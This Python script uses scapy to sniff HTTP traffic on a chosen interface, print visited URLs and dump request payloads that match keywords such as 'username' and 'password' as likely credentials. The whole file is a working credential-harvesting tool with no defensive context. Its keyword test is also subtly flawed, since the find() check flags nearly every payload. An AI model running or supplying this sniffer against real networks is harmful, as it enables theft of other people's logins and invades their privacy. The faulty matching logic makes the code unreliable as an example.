#!/usr/bin/env python

import scapy.all as scapy
import argparse as pars
from scapy.layers import http

def get_sniff_interface():
    parse = pars.ArgumentParser()
    parse.add_argument("-i", "--interface", dest="interface", help="Interface to Sniff on")
    options = parse.parse_args()
    if not options.interface:
        parse.error("interface")
    return options

def sniff(interface_to_sniff_on):
    scapy.sniff(iface=interface_to_sniff_on, store=False, prn=packet_sniff_analyser)

def extract_url(packet):
    # Printing info about URL's visited
    http_method = packet[http.HTTPRequest].Method
    url = packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
    print("HTTP Method: " + str(http_method) + " URL: " + str(url))

def extract_credentials(packet):
    # Processing Raw layer from packet
    load = packet[scapy.Raw].load
    keywordslist = ["username", "login", "user", "password", "pass", "auth"]
    # Testing raw load against likely keywords
    for keyword in keywordslist:
        if (keyword) in str(load) or str(load).find(keyword):
            print("\n\n Possible USER&PASSWORD >>>" + str(load) + "\n")
            break

def packet_sniff_analyser(packet):
    # Processing only HTTP packets
    if packet.haslayer(http.HTTPRequest):
        extract_url(packet)
        if(packet.haslayer(scapy.Raw)):
            extract_credentials(packet)

## Getting arguments from CLI
sniff_arguments = get_sniff_interface()
sniff(sniff_arguments.interface)